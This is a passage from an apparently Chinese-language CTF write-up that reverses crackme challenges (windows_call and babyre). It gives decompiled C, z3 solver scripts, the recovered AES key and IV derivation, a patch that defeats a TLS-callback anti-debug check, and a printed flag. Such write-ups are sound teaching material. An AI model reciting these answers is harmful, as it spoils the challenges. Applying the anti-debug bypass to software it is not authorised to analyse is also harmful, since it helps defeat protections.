class="number">0x58</span>, <span class="number">0xEE</span>, <span class="number">0x97</span>, <span class="number">0x65</span>, <span class="number">0x84</span>, <span class="number">0x44</span>, <span class="number">0xF2</span>, <span class="number">0x10</span>, <span class="number">0x6B</span>, <span class="number">0xE8</span>, <span class="number">0x50</span>, <span class="number">0x24</span>, <span class="number">0x99</span>, <span class="number">0xF6</span>, <span class="number">0xE3</span>, <span class="number">0x21</span>, <span class="number">0x51</span>, <span class="number">0xC2</span>, <span class="number">0x5D</span>, <span class="number">0xBF</span>, <span class="number">0x32</span>]</span><br><span class="line">table = [<span class="number">0xD3</span>, <span class="number">0x1B</span>, <span class="number">0xCC</span>, <span class="number">0x7D</span>, <span class="number">0xEF</span>, <span class="number">0xB9</span>, <span class="number">0x0D</span>, <span class="number">0xC6</span>, <span class="number">0xA0</span>, <span class="number">0xDB</span>, <span class="number">0xE2</span>, <span class="number">0x07</span>, <span class="number">0xFB</span>, <span class="number">0x0F</span>, <span class="number">0xB7</span>, <span class="number">0x0E</span>, <span class="number">0xCB</span>, <span class="number">0x73</span>, <span class="number">0x3A</span>, <span class="number">0x8A</span>, <span class="number">0xC5</span>, <span class="number">0x4E</span>, <span class="number">0x3E</span>, <span class="number">0xEC</span>, <span class="number">0x0C</span>, <span class="number">0xF0</span>, <span class="number">0xA2</span>, <span class="number">0x48</span>, <span class="number">0x94</span>, <span class="number">0x70</span>, <span class="number">0x27</span>, <span class="number">0x1B</span>, <span class="number">0xA4</span>, <span class="number">0x1C</span>, <span class="number">0x17</span>, <span class="number">0x1C</span>, <span class="number">0x0D</span>, <span class="number">0x71</span>, <span class="number">0xC8</span>, <span class="number">0xF2</span>, <span class="number">0x28</span>, <span class="number">0x2B</span>, <span class="number">0x9A</span>, <span class="number">0xA7</span>, <span class="number">0x3A</span>, <span class="number">0x5F</span>, <span class="number">0xB8</span>, <span class="number">0x6E</span>, <span class="number">0x81</span>, <span class="number">0x80</span>, <span class="number">0x54</span>, <span class="number">0x3B</span>, <span class="number">0x9D</span>, <span class="number">0x51</span>, <span class="number">0x0E</span>, <span class="number">0xC6</span>, <span class="number">0x21</span>, <span class="number">0x03</span>, <span class="number">0x49</span>, <span class="number">0xD4</span>, <span class="number">0xB6</span>, <span class="number">0x36</span>, <span class="number">0x31</span>, <span class="number">0x7B</span>]</span><br><span class="line">for i <span class="keyword">in</span> range(<span class="number">32</span>):</span><br><span class="line">    tmp = <span class="number">0xfffffffffffffffe</span></span><br><span class="line">    tmp = tmp^i</span><br><span class="line">    tmp = tmp&amp;i</span><br><span class="line">    if(tmp):</span><br><span class="line">        <span class="built_in">k2</span> = flag[i-<span class="number">1</span>]</span><br><span class="line"><span class="symbol">    else:</span></span><br><span class="line">        <span class="built_in">k2</span> = flag[i+<span class="number">1</span>]</span><br><span class="line">    flag[i] = (flag[i] ^ <span class="number">0x7deeb3f5</span> | flag[i] ^ <span class="number">0x7deeb3f5</span>) ^ (table[i] + <span class="built_in">k2</span>) &amp; <span class="number">0xff</span> ^ <span class="number">0x7deeb3f5</span></span><br><span class="line">for i <span class="keyword">in</span> range(<span class="number">32</span>):</span><br><span class="line">    s<span class="number">.</span><span class="keyword">add</span>(flag[i] == <span class="keyword">cmp</span>[i])</span><br><span class="line">if s<span class="number">.</span>check() == sat:</span><br><span class="line">    model = s<span class="number">.</span>model()</span><br><span class="line">    print(model)</span><br><span class="line"><span class="symbol">else:</span></span><br><span class="line">    print(<span class="string">&quot;unsat&quot;</span>)</span><br><span class="line">#[<span class="number">250</span>,<span class="number">41</span>,<span class="number">215</span>,<span class="number">230</span>,<span class="number">105</span>,<span class="number">26</span>,<span class="number">212</span>,<span class="number">207</span>,<span class="number">159</span>,<span class="number">53</span>,<span class="number">113</span>,<span class="number">97</span>,<span class="number">139</span>,<span class="number">106</span>,<span class="number">203</span>,<span class="number">247</span>,<span class="number">84</span>,<span class="number">69</span>,<span class="number">59</span>,<span class="number">241</span>,<span class="number">195</span>,<span class="number">102</span>,<span class="number">227</span>,<span class="number">137</span>,<span class="number">231</span>,<span class="number">5</span>,<span class="number">251</span>,<span class="number">56</span>,<span class="number">193</span>,<span class="number">111</span>,<span class="number">176</span>,<span class="number">232</span>]</span><br><span class="line"></span><br><span class="line">#<span class="number">0xe6d729fa</span>, <span class="number">0xcfd41a69</span>, <span class="number">0x6171359f</span>, <span class="number">0xf7cb6a8b</span>, <span class="number">0xf13b4554</span>, <span class="number">0x89e366c3</span>, <span class="number">0x38fb05e7</span>, <span class="number">0xe8b06fc1</span></span><br></pre></td></tr></table></figure>

<p>得到的flag，每4个字节组合，并逆序</p>
<p>最抽象的是sub_405480函数</p>
<p><img src="/2022/11/08/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81/image-20221108160739412.png" alt="image-20221108160739412"></p>
<p>我们的flag还要经过这个地方进行加密才能到达下一步，所以还要逆这个地方的汇编，明显是每4个字符进行加密，撸汇编然后z3解就行</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">from z3 import*</span><br><span class="line">s=Solver()</span><br><span class="line">flag = [BitVec(<span class="string">&quot;flag%d&quot;</span> % i,<span class="number">32</span>) <span class="keyword">for</span> i in range(<span class="number">4</span>)]</span><br><span class="line">cmp = [<span class="number">0xe6d729fa</span>, <span class="number">0xcfd41a69</span>, <span class="number">0x6171359f</span>, <span class="number">0xf7cb6a8b</span>, <span class="number">0xf13b4554</span>, <span class="number">0x89e366c3</span>, <span class="number">0x38fb05e7</span>, <span class="number">0xe8b06fc1</span>]</span><br><span class="line">s.add(((flag[<span class="number">0</span>] &lt;&lt; <span class="number">1</span>) - ((<span class="number">0</span> - flag[<span class="number">1</span>]) &amp; <span class="number">0xffffffff</span>) - flag[<span class="number">2</span>] + flag[<span class="number">3</span>]) &amp; <span class="number">0xffffffff</span> == cmp[<span class="number">0</span>])</span><br><span class="line">s.add(((flag[<span class="number">0</span>] - flag[<span class="number">1</span>] + flag[<span class="number">2</span>]) + (<span class="number">0</span> - flag[<span class="number">3</span>]) &amp; <span class="number">0xffffffff</span>) &amp; <span class="number">0xffffffff</span> == cmp[<span class="number">2</span>])</span><br><span class="line">s.add((flag[<span class="number">0</span>] + flag[<span class="number">1</span>] + flag[<span class="number">2</span>] -flag[<span class="number">3</span>])&amp;<span class="number">0xffffffff</span> == cmp[<span class="number">1</span>])</span><br><span class="line">s.add((flag[<span class="number">3</span>] * <span class="number">2</span> + flag[<span class="number">0</span>] + flag[<span class="number">1</span>] * <span class="number">2</span> - flag[<span class="number">2</span>])&amp;<span class="number">0xffffffff</span> == cmp[<span class="number">3</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> s.check() == sat:</span><br><span class="line">    model = s.model()</span><br><span class="line">    print(model)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    print(<span class="string">&quot;unsat&quot;</span>)</span><br><span class="line">flag3 = <span class="number">1194345311</span>,</span><br><span class="line">flag0 = <span class="number">1835889971</span>,</span><br><span class="line">flag2 = <span class="number">1919252016</span>,</span><br><span class="line">flag1 = <span class="number">925987429</span></span><br><span class="line">flag4 = <span class="number">0x63676e69</span></span><br><span class="line">flag5 = <span class="number">0x2874306e</span></span><br><span class="line">flag6 = <span class="number">0x30703054</span></span><br><span class="line">flag7 = <span class="number">0x32686868</span></span><br></pre></td></tr></table></figure>

<p>那四个字节也需要异或回去，得到flag</p>
<p>3ummer1s0ver_C0dingcn0tsT0p0hhhh</p>
<h3 id="windows-call"><a href="#windows-call" class="headerlink" title="windows_call"></a>windows_call</h3><p>这个题是aes题,看起来是个混淆，但混的不多</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sub_402613(v26, <span class="number">1</span>, <span class="number">16</span>, v38, v0 + <span class="number">1028</span>, v42);</span><br></pre></td></tr></table></figure>

<p>这个函数是aes函数，经过动态调试发现key和iv做运算</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">	v29 = v38[v27] ^ (v27 - <span class="number">64</span>);</span><br><span class="line">	v37[v27] = v29;</span><br><span class="line">	v28 += v29;</span><br><span class="line">	++v27;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>用z3找出前几个字节然后解aes就行</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line">s = Solver()</span><br><span class="line">flag = [BitVec(<span class="string">&quot;flag%d&quot;</span> % i,<span class="number">16</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>)]</span><br><span class="line">s.add((flag[<span class="number">0</span>]+<span class="number">0x3800</span>-<span class="number">0x10000</span>)&lt;=<span class="number">0x800</span>)</span><br><span class="line">s.add((flag[<span class="number">0</span>]+<span class="number">0x3800</span>)&gt;<span class="number">0x10000</span>)</span><br><span class="line">s.add((flag[<span class="number">1</span>]+<span class="number">0x3500</span>-<span class="number">0x10000</span>)&lt;=<span class="number">0x500</span>)</span><br><span class="line">s.add((flag[<span class="number">1</span>]+<span class="number">0x3500</span>)&gt;<span class="number">0x10000</span>)</span><br><span class="line">s.add(flag[<span class="number">0</span>]&amp;<span class="number">0xff00</span>&lt;<span class="number">0xca00</span>)</span><br><span class="line">s.add(flag[<span class="number">1</span>]&amp;<span class="number">0xff</span>==<span class="number">0xa0</span>)</span><br><span class="line">s.add(flag[<span class="number">1</span>]-flag[<span class="number">0</span>]==<span class="number">0x2B8</span>)</span><br><span class="line">v25=(flag[<span class="number">0</span>]^flag[<span class="number">1</span>])&amp;<span class="number">0xff</span></span><br><span class="line">v55=(flag[<span class="number">0</span>]^flag[<span class="number">1</span>])&gt;&gt;<span class="number">8</span></span><br><span class="line">iv=[]</span><br><span class="line"><span class="keyword">for</span> v23 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">    iv.append((v55+v23)^(v25+v23))</span><br><span class="line">v57=<span class="number">0</span></span><br><span class="line">v37=[]</span><br><span class="line">v28=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> v27 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">    v29=iv[v27]^(v27-<span class="number">64</span>+<span class="number">0x100</span>)</span><br><span class="line">    v37.append(v29)</span><br><span class="line">    v28+=v29</span><br><span class="line">s.add(v28==<span class="number">0x8a8</span>)</span><br><span class="line"><span class="keyword">if</span> s.check() == sat:</span><br><span class="line">    model = s.model()</span><br><span class="line">    <span class="built_in">print</span>(model)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;unsat&quot;</span>)</span><br><span class="line"><span class="comment">#[flag0 = 51688, flag1 = 52384]</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>然后求出key和iv</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">flag=[<span class="number">51688</span>,<span class="number">52384</span>]</span><br><span class="line">v25=(flag[<span class="number">0</span>]^flag[<span class="number">1</span>])&amp;<span class="number">0xff</span></span><br><span class="line">v55=(flag[<span class="number">0</span>]^flag[<span class="number">1</span>])&gt;&gt;<span class="number">8</span></span><br><span class="line">iv=[]</span><br><span class="line"><span class="keyword">for</span> v23 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">    iv.append((v55+v23)^(v25+v23))</span><br><span class="line">v57=<span class="number">0</span></span><br><span class="line">key=[]</span><br><span class="line">v28=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> v27 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">    v29=iv[v27]^(v27-<span class="number">64</span>+<span class="number">0x100</span>)</span><br><span class="line">    key.append(v29)</span><br><span class="line">    v28+=v29</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>最后解aes就行了</p>
<h3 id="babyre"><a href="#babyre" class="headerlink" title="babyre"></a>babyre</h3><p>动调发现过不去，猜测tls里有反调试</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __stdcall <span class="title function_">TlsCallback_0_0</span><span class="params">(<span class="type">int</span> a1, <span class="type">int</span> a2, <span class="type">int</span> a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  HANDLE CurrentProcess; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> ProcessInformation; <span class="comment">// [esp+E8h] [ebp-Ch] BYREF</span></span><br><span class="line"></span><br><span class="line">  __CheckForDebuggerJustMyCode(byte_2470F4);</span><br><span class="line">  ProcessInformation = <span class="number">0</span>;</span><br><span class="line">  AddVectoredExceptionHandler(<span class="number">0</span>, Handler);<span class="comment">//sbox加密</span></span><br><span class="line">  AddVectoredContinueHandler(<span class="number">0</span>, sub_231041);</span><br><span class="line">  SetUnhandledExceptionFilter(TopLevelExceptionFilter);</span><br><span class="line">  result = j_NtQueryInformationProcess((HANDLE)<span class="number">0xFFFFFFFF</span>, ProcessDebugPort, &amp;ProcessInformation, <span class="number">4u</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( ！result )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( ProcessInformation != <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      CurrentProcess = GetCurrentProcess();</span><br><span class="line">      TerminateProcess(CurrentProcess, <span class="number">1u</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">9</span> / <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>看汇编把result判断的jnz改成jz就能跳过去，最牛的是这个tls里有一个veh，当我们主程序出现除0异常的时候，会跳到handle这个地方</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">sub_239050</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v0; <span class="comment">// al</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v1; <span class="comment">// al</span></span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> v3; <span class="comment">// al</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v4; <span class="comment">// al</span></span><br><span class="line">  __int64 v5; <span class="comment">// [esp-8h] [ebp-11Ch]</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [esp+10h] [ebp-104h]</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// [esp+1Ch] [ebp-F8h]</span></span><br><span class="line">  <span class="type">char</span> v8[<span class="number">12</span>]; <span class="comment">// [esp+28h] [ebp-ECh] BYREF</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// [esp+34h] [ebp-E0h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 j; <span class="comment">// [esp+103h] [ebp-11h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 i; <span class="comment">// [esp+10Fh] [ebp-5h]</span></span><br><span class="line"></span><br><span class="line">  __CheckForDebuggerJustMyCode(byte_2470F4);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">0x10</span>u; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; <span class="number">0x10</span>u; ++j )</span><br><span class="line">    &#123;</span><br><span class="line">      v5 = (j &amp; <span class="number">0xF</span>) + (<span class="type">unsigned</span> __int8)(<span class="number">16</span> * i);</span><br><span class="line">      sub_231442(v5, SHIDWORD(v5));</span><br><span class="line">      dword_244000[<span class="number">16</span> * i + j] = v9;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">0x10</span>u; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; <span class="number">0x10</span>u; ++j )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_231442(<span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int8)sub_2313AC((<span class="type">int</span>)v8) )</span><br><span class="line">      &#123;</span><br><span class="line">        v0 = sub_2312E4(&amp;dword_244000[<span class="number">16</span> * i + j]);</span><br><span class="line">        v1 = sub_2315BE(v0, <span class="number">283</span>);</span><br><span class="line">        sub_231442(v1, <span class="number">0</span>);</span><br><span class="line">        dword_244000[<span class="number">16</span> * i + j] = v7;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    result = i;</span><br><span class="line">    <span class="keyword">if</span> ( i &gt;= <span class="number">0x10</span>u )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; <span class="number">0x10</span>u; ++j )</span><br><span class="line">    &#123;</span><br><span class="line">      v3 = sub_2312E4(&amp;dword_244000[<span class="number">16</span> * i + j]);</span><br><span class="line">      v4 = sub_231299(v3, <span class="number">119</span>);</span><br><span class="line">      sub_231442(v4, <span class="number">0</span>);</span><br><span class="line">      dword_244000[<span class="number">16</span> * i + j] = v6;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个地方是对sbox进行的魔改，通过动调可以知道，他将逆sbox和sbox行列颠倒了，这是第一次魔改，再看主函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main_0</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [esp+D0h] [ebp-1D8h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [esp+DCh] [ebp-1CCh]</span></span><br><span class="line">  <span class="type">char</span> v7[<span class="number">184</span>]; <span class="comment">// [esp+E8h] [ebp-1C0h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v8[<span class="number">4</span>]; <span class="comment">// [esp+1A0h] [ebp-108h] BYREF</span></span><br><span class="line">  _DWORD v9[<span class="number">16</span>]; <span class="comment">// [esp+1E8h] [ebp-C0h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// [esp+228h] [ebp-80h] BYREF</span></span><br><span class="line">  <span class="type">char</span> Str[<span class="number">52</span>]; <span class="comment">// [esp+270h] [ebp-38h] BYREF</span></span><br><span class="line"></span><br><span class="line">  __CheckForDebuggerJustMyCode(byte_2470F4);</span><br><span class="line">  j_memset(Str, <span class="number">0</span>, <span class="number">0x30</span>u);</span><br><span class="line">  sub_2310AF((<span class="type">int</span>)v9, <span class="number">4</span>, <span class="number">32</span>, (<span class="type">int</span>)sub_23116D);</span><br><span class="line">  sub_2310F5(<span class="built_in">std</span>::<span class="built_in">cin</span>, Str);</span><br><span class="line">  <span class="keyword">if</span> ( j_strlen(Str) != <span class="number">32</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  sub_231442(<span class="number">23</span>, <span class="number">0</span>);</span><br><span class="line">  sub_231442(<span class="number">147</span>, <span class="number">0</span>);</span><br><span class="line">  sub_231442(<span class="number">56</span>, <span class="number">0</span>);</span><br><span class="line">  sub_231442(<span class="number">12</span>, <span class="number">0</span>);</span><br><span class="line">  sub_231442(<span class="number">17</span>, <span class="number">0</span>);</span><br><span class="line">  sub_231442(<span class="number">167</span>, <span class="number">0</span>);</span><br><span class="line">  sub_231442(<span class="number">247</span>, <span class="number">0</span>);</span><br><span class="line">  sub_231442(<span class="number">84</span>, <span class="number">0</span>);</span><br><span class="line">  sub_231442(<span class="number">247</span>, <span class="number">0</span>);</span><br><span class="line">  sub_231442(<span class="number">137</span>, <span class="number">0</span>);</span><br><span class="line">  sub_231442(<span class="number">200</span>, <span class="number">0</span>);</span><br><span class="line">  sub_231442(<span class="number">32</span>, <span class="number">0</span>);</span><br><span class="line">  sub_231442(<span class="number">212</span>, <span class="number">0</span>);</span><br><span class="line">  sub_231442(<span class="number">26</span>, <span class="number">0</span>);</span><br><span class="line">  sub_231442(<span class="number">250</span>, <span class="number">0</span>);</span><br><span class="line">  sub_231442(<span class="number">37</span>, <span class="number">0</span>);</span><br><span class="line">  sub_23124E(Str, v9, <span class="number">32</span>);</span><br><span class="line">  sub_2310AF((<span class="type">int</span>)v7, <span class="number">4</span>, <span class="number">44</span>, (<span class="type">int</span>)sub_2313D4);</span><br><span class="line">  sub_231483((<span class="type">int</span>)v8, (<span class="type">int</span>)v7);<span class="comment">//初始化</span></span><br><span class="line">  sub_2315FF((<span class="type">int</span>)v9, (<span class="type">int</span>)v7);<span class="comment">//主要加密</span></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">16</span>; ++i )</span><br><span class="line">    sub_23164A(&amp;v9[i]);<span class="comment">//对key进行异或</span></span><br><span class="line">  sub_231483((<span class="type">int</span>)v8, (<span class="type">int</span>)v7);<span class="comment">//初始化</span></span><br><span class="line">  sub_2315FF((<span class="type">int</span>)&amp;v10, (<span class="type">int</span>)v7);<span class="comment">//主要加密</span></span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; <span class="number">32</span>; ++j )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int8)sub_2313AC((<span class="type">int</span>)&amp;v9[j]) )</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  v3 = sub_2312BC(<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;Congratulations! Your flag is: flag&#123;(your input)&#125;&quot;</span>);</span><br><span class="line">  <span class="built_in">std</span>::ostream::operator&lt;&lt;(v3, sub_23105A);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个加密是将32位的字符串先进行前16位aes加密，然后得到加密后的16位再与之前的key进行异或，然后得到后16位的key</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span 